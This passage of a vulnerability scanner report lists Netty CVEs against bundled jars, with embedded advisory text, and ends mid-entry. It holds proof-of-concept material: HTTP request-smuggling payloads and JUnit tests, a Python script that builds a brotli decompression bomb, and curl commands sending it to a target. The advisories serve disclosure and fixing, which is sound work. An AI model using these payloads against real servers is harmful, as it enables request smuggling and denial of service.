                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42580 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:4a1f7648faaae5f2fe2b199fcefea9c71ca19cbe14ae6a3cff79b
                        │      │                   56226947af6 
                        │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to incorrect
                        │      │                   chunk size parsing 
                        │      ├ Description     : ### Summary
                        │      │                   Netty's chunk size parser silently overflows int, enabling
                        │      │                   request smuggling attacks.
                        │      │                   
                        │      │                   ### Details
                        │      │                   io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize
                        │      │                   silently overflows int.
                        │      │                   The size is accumulated as follows:
                        │      │                   result *= 16;
                        │      │                   result += digit;
                        │      │                   The result is checked only for negative values. However,
                        │      │                   with a carefully crafted chunk size, the result can be a
                        │      │                   valid size.
                        │      │                   ### PoC
                        │      │                   The test below shows Netty successfully parsing the second
                        │      │                   request, demonstrating how an attacker can smuggle a second
                        │      │                   request inside a chunked body.
                        │      │                   ```java
                        │      │                   @Test
                        │      │                   public void test() {
                        │      │                       String requestStr = "POST / HTTP/1.1\r\n" +
                        │      │                               "Host: localhost\r\n" +
                        │      │                               "Transfer-Encoding: chunked\r\n\r\n" +
                        │      │                               "100000004\r\n" +
                        │      │                               "test\r\n" +
                        │      │                               "0\r\n" +
                        │      │                               "\r\n" +
                        │      │                               "GET /smuggled HTTP/1.1\r\n" +
                        │      │                               "Content-Length: 0\r\n" +
                        │      │                               "\r\n";
                        │      │                       EmbeddedChannel channel = new EmbeddedChannel(new
                        │      │                   HttpRequestDecoder());
                        │      │                      
                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(reques
                        │      │                   tStr, CharsetUtil.US_ASCII)));
                        │      │                       // Request 1
                        │      │                       HttpRequest request = channel.readInbound();
                        │      │                       assertTrue(request.decoderResult().isSuccess());
                        │      │                       HttpContent content = channel.readInbound();
                        │      │                       assertTrue(content.decoderResult().isSuccess());
                        │      │                       assertEquals("test",
                        │      │                   content.content().toString(CharsetUtil.US_ASCII));
                        │      │                       content.release();
                        │      │                       LastHttpContent last = channel.readInbound();
                        │      │                       assertTrue(last.decoderResult().isSuccess());
                        │      │                       last.release();
                        │      │                       // Request 2
                        │      │                       request = channel.readInbound();
                        │      │                       last = channel.readInbound();
                        │      │                   }
                        │      │                   ```
                        │      │                   ### Impact
                        │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
                        │      │                   requests 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L 
                        │      │                         ╰ V3Score : 6.5 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-m4cv-j2px-7723 
                        ├ [6]  ╭ VulnerabilityID : CVE-2026-42581 
                        │      ├ VendorIDs        ─ [0]: GHSA-xxqh-mfjm-7mv9 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42581 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:e06e8aca9203849f5db02e2419dd256a6f1f2ce2ba486922754db
                        │      │                   f2c20029b19 
                        │      ├ Title           : Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
                        │      │                   Sanitization 
                        │      ├ Description     : # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling
                        │      │                   Sanitization
                        │      │                   
                        │      │                   | Field     | Value |
                        │      │                   |-----------|-------|
                        │      │                   | Library   | `io.netty:netty-codec-http` |
                        │      │                   | Component | `codec-http` — `HttpObjectDecoder` |
                        │      │                   | Severity  | **HIGH** |
                        │      │                   | Affects   | HEAD, commit `4f3533ae` confirmed |
                        │      │                   ---
                        │      │                   ## Summary
                        │      │                   `HttpObjectDecoder` strips a conflicting `Content-Length`
                        │      │                   header when a request carries both `Transfer-Encoding:
                        │      │                   chunked` and `Content-Length`, but only for HTTP/1.1
                        │      │                   messages. The guard is absent for HTTP/1.0. An attacker that
                        │      │                    sends an HTTP/1.0 request with both headers causes Netty to
                        │      │                    decode the body as chunked while leaving `Content-Length`
                        │      │                   intact in the forwarded `HttpMessage`. Any downstream proxy
                        │      │                   or handler that trusts `Content-Length` over
                        │      │                   `Transfer-Encoding` will disagree on message boundaries,
                        │      │                   enabling request smuggling.
                        │      │                   ## Root Cause
                        │      │                   ```java
                        │      │                   // HttpObjectDecoder.java:828-833
                        │      │                   if (HttpUtil.isTransferEncodingChunked(message)) {
                        │      │                       this.chunked = true;
                        │      │                       if (!contentLengthFields.isEmpty() &&
                        │      │                   message.protocolVersion() == HttpVersion.HTTP_1_1) {
                        │      │                          
                        │      │                   handleTransferEncodingChunkedWithContentLength(message);  //
                        │      │                    strips CL — HTTP/1.1 only
                        │      │                       }
                        │      │                       return State.READ_CHUNK_SIZE;
                        │      │                   }
                        │      │                   // HttpObjectDecoder.java:870-873
                        │      │                   protected void
                        │      │                   handleTransferEncodingChunkedWithContentLength(HttpMessage
                        │      │                   message) {
                        │      │                      
                        │      │                   message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
                        │      │                       contentLength = Long.MIN_VALUE;
                        │      │                   ```
                        │      │                   The conflict-resolution path is gated on
                        │      │                   `message.protocolVersion() == HttpVersion.HTTP_1_1`. When
                        │      │                   the request declares `HTTP/1.0`, the condition is false,
                        │      │                   `handleTransferEncodingChunkedWithContentLength` is never
                        │      │                   called, and the `Content-Length` header survives into the
                        │      │                   forwarded message. Netty still processes the body as
                        │      │                   chunked; a downstream component that is CL-first interprets
                        │      │                   the same bytes as a separate request.
                        │      │                   ## Proof of Concept
                        │      │                   POST /api HTTP/1.0\r\n
                        │      │                   Host: internal.example.com\r\n
                        │      │                   Transfer-Encoding: chunked\r\n
                        │      │                   Content-Length: 0\r\n
                        │      │                   \r\n
                        │      │                   5\r\n
                        │      │                   GPOST\r\n
                        │      │                   0\r\n
                        │      │                   Netty consumes the full chunked body (5 bytes + terminator).
                        │      │                    A downstream CL-first proxy reads `Content-Length: 0`,
                        │      │                   considers the request complete at the blank line, and treats
                        │      │                    `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second
                        │      │                   request.
                        │      │                   ## Conditions Required
                        │      │                   1. Netty is deployed behind a reverse proxy or load balancer
                        │      │                    that is `Content-Length`-first (nginx, some HAProxy
                        │      │                   configs, AWS ALB in certain modes).
                        │      │                   2. Attacker can send HTTP/1.0 requests (either directly or
                        │      │                   by downgrading via connection manipulation).
                        │      │                   3. No additional HTTP/1.0 stripping layer between attacker
                        │      │                   and Netty.
                        │      │                   ## Impact
                        │      │                   Request smuggling at the Netty edge. Allows cache poisoning,
                        │      │                    session fixation against other users, unauthorized access
                        │      │                   to internal endpoints, and bypassing of WAF or
                        │      │                   authentication layers that inspect only the first logical
                        │      │                   ## Confirmed PoC Test
                        │      │                   Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`.
                        │      │                   Both tests pass, confirming the vulnerability and the
                        │      │                   HTTP/1.1 contrast.
                        │      │                   package io.netty.handler.codec.http;
                        │      │                   import io.netty.buffer.Unpooled;
                        │      │                   import io.netty.channel.embedded.EmbeddedChannel;
                        │      │                   import io.netty.util.CharsetUtil;
                        │      │                   import org.junit.jupiter.api.Test;
                        │      │                   import static org.junit.jupiter.api.Assertions.*;
                        │      │                   public class NettySmugglingSec001Test {
                        │      │                       // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL
                        │      │                    conflict
                        │      │                       @Test
                        │      │                       public void http10_contentLengthNotStripped() {
                        │      │                           EmbeddedChannel ch = new EmbeddedChannel(new
                        │      │                   HttpRequestDecoder());
                        │      │                           ch.writeInbound(Unpooled.copiedBuffer(
                        │      │                                   "POST /api HTTP/1.0\r\n" +
                        │      │                                   "Transfer-Encoding: chunked\r\n" +
                        │      │                                   "Content-Length: 0\r\n" +
                        │      │                                   "\r\n" +
                        │      │                                   "5\r\nGPOST\r\n0\r\n\r\n",
                        │      │                   CharsetUtil.US_ASCII));
                        │      │                           HttpRequest req = ch.readInbound();
                        │      │                           assertEquals(HttpVersion.HTTP_1_0,
                        │      │                   req.protocolVersion());
                        │      │                           // Content-Length: 0 survives — downstream CL-first
                        │      │                   proxy treats chunked body as new request
                        │      │                   assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENG
                        │      │                   TH), "VULNERABLE: CL not stripped");
                        │      │                           ch.finishAndReleaseAll();
                        │      │                       // SAFE: HTTP/1.1 correctly strips Content-Length on
                        │      │                   TE+CL conflict
                        │      │                       public void http11_contentLengthStripped() {
                        │      │                                   "POST /api HTTP/1.1\r\n" +
                        │      │                   assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH)
                        │      │                   , "SAFE: CL correctly stripped");
                        │      │                   ## Fix Guidance
                        │      │                   Remove the `message.protocolVersion() ==
                        │      │                   HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying
                        │      │                    `handleTransferEncodingChunkedWithContentLength`
                        │      │                   unconditionally whenever both `Transfer-Encoding: chunked`
                        │      │                   and `Content-Length` are present, regardless of protocol
                        │      │                   version. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N 
                        │      │                         ╰ V3Score : 5.8 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-xxqh-mfjm-7mv9 
                        ├ [7]  ╭ VulnerabilityID : CVE-2026-42585 
                        │      ├ VendorIDs        ─ [0]: GHSA-38f8-5428-x5cv 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
                        │      │                  ╰ UID : 42139b2b89dda2f4 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42585 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:7419c9f0809b4d7e52fd6bbce26d4f255f44b83b5136f21b64c63
                        │      │                   ef1e5207783 
                        │      ├ Title           : Netty vulnerable to HTTP Request Smuggling due to malformed
                        │      │                   Transfer-Encoding 
                        │      ├ Description     : ### Summary
                        │      │                   Netty incorrectly parses malformed Transfer-Encoding,
                        │      │                   enabling request smuggling attacks.
                        │      │                   
                        │      │                   ### Details
                        │      │                   Netty incorrectly marks a request as chunked when malformed
                        │      │                   "Transfer-Encoding: chunked, identity" is present.
                        │      │                   According to RFC
                        │      │                   https://datatracker.ietf.org/doc/html/rfc9112#name-message-b
                        │      │                   ody-length
                        │      │                   "
                        │      │                   If a Transfer-Encoding header field is present in a request
                        │      │                   and the chunked transfer coding is not the final encoding,
                        │      │                    the message body length cannot be determined reliably; the
                        │      │                   server MUST respond with the 400 (Bad Request)
                        │      │                    status code and then close the connection.
                        │      │                   A possible scenario is when Netty is behind a proxy that
                        │      │                   doesn't reject requests with "Transfer-Encoding: chunked,
                        │      │                   identity", but prefers "Content-Length" and forwards the
                        │      │                   content to Netty.
                        │      │                   ### PoC
                        │      │                   The test below shows Netty successfully parsing the second
                        │      │                   request, demonstrating how an attacker can smuggle a second
                        │      │                   request inside a request body.
                        │      │                   ```java
                        │      │                   @Test
                        │      │                       public void test() {
                        │      │                           String requestStr = "POST / HTTP/1.1\r\n" +
                        │      │                                   "Host: localhost\r\n" +
                        │      │                                   "Transfer-Encoding: chunked, identity\r\n"
                        │      │                   +
                        │      │                                   "Content-Length: 48\r\n" +
                        │      │                                   "\r\n" +
                        │      │                                   "0\r\n" +
                        │      │                                   "GET /smuggled HTTP/1.1\r\n" +
                        │      │                                   "\r\n";
                        │      │                           EmbeddedChannel channel = new EmbeddedChannel(new
                        │      │                   HttpRequestDecoder());
                        │      │                          
                        │      │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(reques
                        │      │                   tStr, CharsetUtil.US_ASCII)));
                        │      │                           // Request 1
                        │      │                           HttpRequest request = channel.readInbound();
                        │      │                           assertTrue(request.decoderResult().isSuccess());
                        │      │                   assertTrue(request.headers().contains("Transfer-Encoding"));
                        │      │                   assertFalse(request.headers().contains("Content-Length"));
                        │      │                           LastHttpContent last = channel.readInbound();
                        │      │                           assertTrue(last.decoderResult().isSuccess());
                        │      │                           last.release();
                        │      │                           // Request 2
                        │      │                           request = channel.readInbound();
                        │      │                           last = channel.readInbound();
                        │      │                       }
                        │      │                   ```
                        │      │                   ### Impact
                        │      │                   HTTP Request Smuggling: Attacker injects arbitrary HTTP
                        │      │                   requests 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N 
                        │      │                         ╰ V3Score : 6.5 
                        │      ╰ References       ╭ [0]: https://datatracker.ietf.org/doc/html/rfc9112#name-mes
                        │                         │      sage-body-length 
                        │                         ├ [1]: https://github.com/netty/netty 
                        │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-38f8-5428-x5cv 
                        ├ [8]  ╭ VulnerabilityID : CVE-2026-42587 
                        │      ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
                        │      ├ PkgName         : io.netty:netty-codec-http2 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
                        │      │                  ╰ UID : c9374114bd085c75 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de81513
                        │      │                   911ed991da4 
                        │      ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
                        │      │                   Content-Encoding set to br/zstd/snappy leads to
                        │      │                   decompression bomb DoS 
                        │      ├ Description     : ## Summary
                        │      │                   
                        │      │                   `HttpContentDecompressor` accepts a `maxAllocation`
                        │      │                   parameter to limit decompression buffer size and prevent
                        │      │                   decompression bomb attacks. This limit is correctly enforced
                        │      │                    for gzip and deflate encodings via `ZlibDecoder`, but is
                        │      │                   silently ignored when the content encoding is `br` (Brotli),
                        │      │                    `zstd`, or `snappy`. An attacker can bypass the configured
                        │      │                   decompression limit by sending a compressed payload with
                        │      │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
                        │      │                   causing unbounded memory allocation and out-of-memory denial
                        │      │                    of service.
                        │      │                   The same vulnerability exists in
                        │      │                   `DelegatingDecompressorFrameListener` for HTTP/2
                        │      │                   connections.
                        │      │                   ## Details
                        │      │                   `HttpContentDecompressor` stores the `maxAllocation` value
                        │      │                   at construction time (`HttpContentDecompressor.java:89`) and
                        │      │                    uses it in `newContentDecoder()` to create the appropriate
                        │      │                   decompression handler.
                        │      │                   For gzip/deflate, `maxAllocation` is forwarded to
                        │      │                   `ZlibCodecFactory.newZlibDecoder()`:
                        │      │                   ```java
                        │      │                   // HttpContentDecompressor.java:101 — maxAllocation IS
                        │      │                   enforced
                        │      │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
                        │      │                   maxAllocation))
                        │      │                   ```
                        │      │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
                        │      │                   hard cap by setting the buffer's `maxCapacity` and throwing
                        │      │                   `DecompressionException` when the limit is reached:
                        │      │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
                        │      │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
                        │      │                   maxAllocation), maxAllocation);
                        │      │                   // ZlibDecoder.java:80 — throws when exceeded
                        │      │                   throw new DecompressionException("Decompression buffer has
                        │      │                   reached maximum size: " + buffer.maxCapacity());
                        │      │                   For brotli, zstd, and snappy, the decoders are created
                        │      │                   without any size limit:
                        │      │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
                        │      │                   .handlers(new BrotliDecoder())
                        │      │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
                        │      │                   .handlers(new SnappyFrameDecoder())
                        │      │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
                        │      │                   .handlers(new ZstdDecoder())
                        │      │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
                        │      │                   there is no way to constrain its output. It streams
                        │      │                   decompressed data in chunks via `fireChannelRead` with no
                        │      │                   total limit.
                        │      │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
                        │      │                   but this only constrains individual buffer allocations, not
                        │      │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
                        │      │                   creates new buffers and fires `channelRead` repeatedly, so
                        │      │                   total decompressed output is unbounded.
                        │      │                   The identical pattern exists in
                        │      │                   `DelegatingDecompressorFrameListener.newContentDecompressor(
                        │      │                   )` at lines 188-210 for HTTP/2.
                        │      │                   ## PoC
                        │      │                   1. Configure a Netty HTTP server with decompression bomb
                        │      │                   protection:
                        │      │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
                        │      │                   1MB max
                        │      │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
                        │      │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
                        │      │                   decompressed):
                        │      │                   ```python
                        │      │                   import brotli
                        │      │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
                        │      │                   compressed = brotli.compress(bomb, quality=11)
                        │      │                   with open('bomb.br', 'wb') as f:
                        │      │                       f.write(compressed)
                        │      │                   # compressed size: ~1KB
                        │      │                   3. Send the bomb with gzip encoding (BLOCKED by
                        │      │                   maxAllocation):
                        │      │                   ```bash
                        │      │                   # This is caught — ZlibDecoder enforces the 1MB limit
                        │      │                   curl -X POST http://target:8080/api \
                        │      │                     -H 'Content-Encoding: gzip' \
                        │      │                     --data-binary @bomb.gz
                        │      │                   # Result: DecompressionException thrown at 1MB
                        │      │                   4. Send the same bomb with brotli encoding (BYPASSES
                        │      │                   # This bypasses the limit — BrotliDecoder has no
                        │      │                   maxAllocation
                        │      │                     -H 'Content-Encoding: br' \
                        │      │                     --data-binary @bomb.br
                        │      │                   # Result: Full 1GB decompressed into memory → OOM
                        │      │                   5. The same bypass works with `Content-Encoding: zstd` and
                        │      │                   `Content-Encoding: snappy`.
                        │      │                   ## Impact
                        │      │                   - **Denial of Service**: An attacker can cause out-of-memory
                        │      │                    conditions on any Netty server that relies on
                        │      │                   `maxAllocation` for decompression bomb protection, by simply
                        │      │                    using a non-gzip content encoding.
                        │      │                   - **False sense of security**: Developers who explicitly
                        │      │                   configure `maxAllocation` to protect against decompression
                        │      │                   bombs are not actually protected for brotli, zstd, or snappy
                        │      │                    encodings. The API documentation implies all encodings are
                        │      │                   covered.
                        │      │                   - **Trivial bypass**: The attacker only needs to change one
                        │      │                   HTTP header (`Content-Encoding: br` instead of
                        │      │                   `Content-Encoding: gzip`) to circumvent the protection
                        │      │                   entirely.
                        │      │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
                        │      │                   both `HttpContentDecompressor` (HTTP/1.1) and
                        │      │                   `DelegatingDecompressorFrameListener` (HTTP/2).
                        │      │                   ## Recommended Fix
                        │      │                   Pass `maxAllocation` to all decoder constructors. For
                        │      │                   `BrotliDecoder`, which currently has no `maxAllocation`
                        │      │                   support, add the parameter:
                        │      │                   **HttpContentDecompressor.java** — pass maxAllocation to all
                        │      │                    decoders:
                        │      │                   // Line 120: BrotliDecoder — add maxAllocation support
                        │      │                   .handlers(new BrotliDecoder(maxAllocation))
                        │      │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
                        │      │                   .handlers(new SnappyFrameDecoder(maxAllocation))
                        │      │                   // Line 138: ZstdDecoder — forward the configured
                        │      │                   .handlers(new ZstdDecoder(maxAllocation))
                        │      │                   **DelegatingDecompressorFrameListener.java** — same fix at
                        │      │                   lines 188-210.
                        │      │                   **BrotliDecoder** — add `maxAllocation` parameter with the
                        │      │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
                        │      │                   set buffer maxCapacity and throw `DecompressionException`
                        │      │                   when the total decompressed output exceeds the limit.
                        │      │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
                        │      │                   equivalent enforcement.
                        │      │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
                        │      │                   total output across all buffers is bounded (not just
                        │      │                   per-buffer allocation size). 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
                        │      │                         ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-f6hv-jmp6-3vwv 
                        ├ [9]  ╭ VulnerabilityID : CVE-2026-42578 
                        │      ├ VendorIDs        ─ [0]: GHSA-45q3-82m4-75jr 
                        │      ├ PkgName         : io.netty:netty-handler-proxy 
                        │      ├ PkgPath         : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
                        │      │                  ╰ UID : 8344d1e8c7524c10 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42578 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:abd51ae1d37b71a2b0d1e0382a01595512c746d45ef85bfe84b3a
                        │      │                   488cbcb55da 
                        │      ├ Title           : Netty has HTTP Header Injection via HttpProxyHandler
                        │      │                   Disabled Validation (Incomplete Fix CVE-2025-67735) 
                        │      ├ Description     : # Security Vulnerability Report: HTTP Header Injection via
                        │      │                   HttpProxyHandler Disabled Validation in Netty
                        │      │                   
                        │      │                   ## 1. Vulnerability Summary
                        │      │                   | Field | Value |
                        │      │                   |-------|-------|
                        │      │                   | **Product** | Netty |
                        │      │                   | **Version** | 4.2.12.Final (and all prior versions) |
                        │      │                   | **Component** | `io.netty.handler.proxy.HttpProxyHandler`
                        │      │                   |
                        │      │                   | **Vulnerability Type** | CWE-113: Improper Neutralization
                        │      │                   of CRLF Sequences in HTTP Headers |
                        │      │                   | **Impact** | HTTP Header Injection in CONNECT Proxy
                        │      │                   Requests |
                        │      │                   | **CVSS 3.1 Score** | **7.5 (High)** |
                        │      │                   | **CVSS 3.1 Vector** |
                        │      │                   `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
                        │      │                   | **Related Advisory** | **GHSA-84h7-rjj3-6jx4** (Incomplete
                        │      │                    Fix) |
                        │      │                   ## 2. Affected Components
                        │      │                   - `io.netty.handler.proxy.HttpProxyHandler` —
                        │      │                   `newInitialMessage()` method (line 176) explicitly disables
                        │      │                   header validation via `withValidation(false)`
                        │      │                   ## 3. Vulnerability Description
                        │      │                   Netty's `HttpProxyHandler` constructs HTTP CONNECT requests
                        │      │                   with **header validation explicitly disabled**. The
                        │      │                   `newInitialMessage()` method (line 176) creates headers
                        │      │                   using
                        │      │                   `DefaultHttpHeadersFactory.headersFactory().withValidation(f
                        │      │                   alse)`, then adds user-provided `outboundHeaders` (line
                        │      │                   188-190) without any CRLF validation. This allows an
                        │      │                   attacker who can influence the outbound headers to inject
                        │      │                   arbitrary HTTP headers into the CONNECT request sent to the
                        │      │                   proxy server.
                        │      │                   ### Root Cause
                        │      │                   ```java
                        │      │                   // HttpProxyHandler.java:176-190
                        │      │                   protected Object newInitialMessage(ChannelHandlerContext
                        │      │                   ctx) throws Exception {
                        │      │                       // ...
                        │      │                       HttpHeadersFactory headersFactory =
                        │      │                   DefaultHttpHeadersFactory.headersFactory()
                        │      │                           .withValidation(false);  // <-- VALIDATION
                        │      │                   EXPLICITLY DISABLED
                        │      │                       FullHttpRequest req = new DefaultFullHttpRequest(
                        │      │                           HttpVersion.HTTP_1_1, HttpMethod.CONNECT,
                        │      │                           url, Unpooled.EMPTY_BUFFER, headersFactory,
                        │      │                   headersFactory);
                        │      │                       req.headers().set(HttpHeaderNames.HOST, hostHeader);
                        │      │                       if (authorization != null) {
                        │      │                          
                        │      │                   req.headers().set(HttpHeaderNames.PROXY_AUTHORIZATION,
                        │      │                   authorization);
                        │      │                       }
                        │      │                       if (outboundHeaders != null) {
                        │      │                           req.headers().add(outboundHeaders);  // <-- USER
                        │      │                   HEADERS ADDED WITHOUT VALIDATION
                        │      │                       return req;
                        │      │                   }
                        │      │                   ```
                        │      │                   The `outboundHeaders` parameter comes from the
                        │      │                   `HttpProxyHandler` constructor (lines 80-93, 99-127), which
                        │      │                   is supplied by application code.
                        │      │                   ### Incomplete Fix of GHSA-84h7-rjj3-6jx4
                        │      │                   **This vulnerability represents an incomplete fix of the
                        │      │                   previously acknowledged security advisory
                        │      │                   [GHSA-84h7-rjj3-6jx4](https://github.com/netty/netty/securit
                        │      │                   y/advisories/GHSA-84h7-rjj3-6jx4).**
                        │      │                   The GHSA-84h7-rjj3-6jx4 fix addressed HTTP CRLF injection by
                        │      │                    adding URI validation via `validateRequestLineTokens()` in
                        │      │                   `DefaultHttpRequest` and enabling header validation by
                        │      │                   default through `DefaultHttpHeadersFactory`. However,
                        │      │                   `HttpProxyHandler` **explicitly opts out** of the fix by
                        │      │                   calling `withValidation(false)`, creating a gap where:
